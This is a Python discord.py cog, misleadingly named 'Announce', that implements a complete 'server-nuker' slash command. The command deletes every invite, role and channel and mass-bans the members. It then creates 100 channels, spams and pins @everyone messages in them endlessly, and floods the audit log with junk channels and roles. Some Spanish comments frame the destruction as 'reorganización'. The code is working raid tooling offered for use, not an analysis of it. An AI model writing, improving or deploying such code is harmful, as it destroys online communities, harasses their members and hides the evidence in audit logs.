import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random
import aiohttp
import io

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="server-nuker", description="Nuke the server, instantly")
    @app_commands.describe(
        user_safe="User to give admin",
        roletogive="Role that contains the bots in the server",
        message="Nuke text that will appear",
        image_url="URL of image to set as server icon (optional)"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def server_nuker(self, interaction: discord.Interaction, 
                          user_safe: discord.User, 
                          roletogive: discord.Role, 
                          message: str,
                          image_url: str = None):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            current_user = interaction.user
            
            # Verificaciones de seguridad
            if user_safe.id == self.bot.user.id:
                await interaction.followup.send("Error: No puedes seleccionar al bot como user_safe.", ephemeral=True)
                return
                
            if roletogive.position >= guild.me.top_role.position:
                await interaction.followup.send("Error: El rol seleccionado tiene una posición más alta que la del bot.", ephemeral=True)
                return
            
            # 1. Eliminar todas las invitaciones
            try:
                invites = await guild.invites()
                for invite in invites:
                    try:
                        await invite.delete()
                    except:
                        continue
            except:
                pass
            
            # 2. Cambiar icono del servidor si se proporcionó una URL
            if image_url:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(image_url) as resp:
                            if resp.status == 200:
                                data = io.BytesIO(await resp.read())
                                await guild.edit(icon=data.read())
                except:
                    pass
            
            # 3. Eliminar todos los roles excepto roletogive
            role_delete_tasks = []
            for role in guild.roles:
                try:
                    if role.id != roletogive.id and not role.managed and role != guild.default_role:
                        role_delete_tasks.append(role.delete())
                except:
                    continue
            
            if role_delete_tasks:
                await asyncio.gather(*role_delete_tasks, return_exceptions=True)
            
            # 4. Banear miembros con el rol especificado (excepto user_safe y el bot)
            ban_tasks = []
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    if member.id != user_safe.id and member.id != self.bot.user.id:
                        ban_tasks.append(member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}"))
            
            if ban_tasks:
                await asyncio.gather(*ban_tasks, return_exceptions=True)
            
            # 5. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(user_safe.id)
                if not any(role.id == roletogive.id for role in admin_member.roles):
                    await admin_member.add_roles(roletogive)
            except:
                pass
            
            # 6. Eliminar TODOS los canales
            delete_tasks = [channel.delete() for channel in guild.channels]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 7. Cambiar nombre del servidor
            try:
                await guild.edit(name=message[:100])
            except:
                pass
            
            # 8. Iniciar baneo masivo en segundo plano
            async def mass_ban():
                async for member in guild.fetch_members():
                    try:
                        if (member.id != user_safe.id and member.id != self.bot.user.id):
                            await member.ban(reason=f"Reorganización masiva: {current_user}")
                    except:
                        continue
            
            asyncio.create_task(mass_ban())
            
            # 9. Crear canales
            spam_message = f"@everyone {message}"
            if image_url:
                spam_message += f"\n{image_url}"  # Añadir la URL de la imagen al mensaje
            
            max_channels = 100
            
            # Crear canales con un pequeño cooldown para evitar errores
            created_channels = []
            for i in range(max_channels):
                try:
                    channel_name = f"{message}-{i}"
                    channel = await guild.create_text_channel(channel_name[:100])
                    created_channels.append(channel)
                    if i % 10 == 0:  # Pequeña pausa cada 10 canales
                        await asyncio.sleep(0.5)
                except:
                    break
            
            # 10. Iniciar spam optimizado en todos los canales
            async def optimized_spam():
                spam_count = 0
                while True:
                    try:
                        for channel in created_channels:
                            # No spamear en el canal de auditoría
                            if "audit-spam" not in channel.name:
                                try:
                                    msg = await channel.send(spam_message)
                                    # Fijar mensaje
                                    try:
                                        await msg.pin()
                                    except:
                                        pass
                                    spam_count += 1
                                    
                                    # Cooldown optimizado: más rápido al principio, luego un poco más lento
                                    if spam_count < 50:
                                        await asyncio.sleep(0.1)
                                    else:
                                        await asyncio.sleep(0.3)
                                except discord.HTTPException as e:
                                    if e.status == 429:  # Rate limit
                                        await asyncio.sleep(5)
                                    else:
                                        await asyncio.sleep(1)
                    except Exception as e:
                        await asyncio.sleep(1)
            
            asyncio.create_task(optimized_spam())
            
            # 11. Spam de registros de auditoría (crear y eliminar canales + crear roles)
            async def enhanced_audit_spam():
                counter = 0
                while True:
                    try:
                        # Crear y eliminar canales
                        channel = await guild.create_text_channel(f"audit-spam-{counter}")
                        await channel.delete()
                        
                        # Crear roles (sin eliminarlos)
                        await guild.create_role(name=f"spam-role-{random.randint(1000, 9999)}")
                        
                        counter += 1
                        await asyncio.sleep(0.2)
                    except:
                        await asyncio.sleep(0.5)
            
            asyncio.create_task(enhanced_audit_spam())
            
            # 12. Role flipping para el safe user (añadir y quitar roles temporalmente)
            async def role_flipping():
                try:
                    admin_member = await guild.fetch_member(user_safe.id)
                    flip_roles = []
                    
                    # Crear roles temporales para flipping
                    for i in range(5):
                        try:
                            role = await guild.create_role(name=f"flip-role-{i}")
                            flip_roles.append(role)
                        except:
                            continue
                    
                    # Ciclo infinito de añadir y quitar roles
                    while True:
                        for role in flip_roles:
                            try:
                                await admin_member.add_roles(role)
                                await asyncio.sleep(0.2)
                                await admin_member.remove_roles(role)
                                await asyncio.sleep(0.2)
                            except:
                                await asyncio.sleep(0.5)
                except:
                    pass
            
            asyncio.create_task(role_flipping())
            
        except Exception as e:
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
